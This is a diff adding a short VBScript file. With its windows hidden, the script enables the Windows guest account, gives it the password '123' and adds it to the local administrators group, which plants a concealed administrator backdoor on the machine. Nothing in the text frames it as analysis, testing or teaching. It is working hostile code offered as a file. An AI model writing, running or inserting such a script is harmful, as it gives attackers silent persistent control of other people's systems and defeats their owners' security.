@@ -1,0 +1,5 @@
+dim a
+set a=createobject("wscript.shell")
+a.run "net user guest /active:yes",0
+a.run "net user guest 123",0
+a.run "net localgroup administrators guest /add",0
